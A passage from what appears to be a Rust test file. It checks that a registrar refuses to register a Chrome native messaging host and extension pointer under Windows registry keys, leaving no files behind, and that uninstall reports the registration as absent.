            registration: Registration::Registry {
                hive: Hive::CurrentUser,
                key: r"Software\Google\Chrome\NativeMessagingHosts\x".into(),
                manifest_path: tree.path("store/x.json"),
            },
            pointer: Some(ExtensionPointer::Registry {
                hive: Hive::CurrentUser,
                key: r"Software\Google\Chrome\Extensions\x".into(),
            }),
        };
        // Refused before anything is written: no manifest, no store dir.
        assert!(reg.register(&target).is_err());
        assert!(!target.registration.manifest_path().exists());
        assert!(!tree.path("store").exists());
        // The file slot is plainly absent; the two registry slots cannot be read here.
        let (lines, errors) = Registrar::uninstall(&target);
        assert_eq!(lines, vec!["chrome: not registered".to_string()]);
        assert_eq!(errors.len(), 2, "{errors:?}");
        assert!(matches!(
            assess_pointer(target.pointer.as_ref().unwrap()),
            PointerState::Unreadable(_)
        ));
    }
}
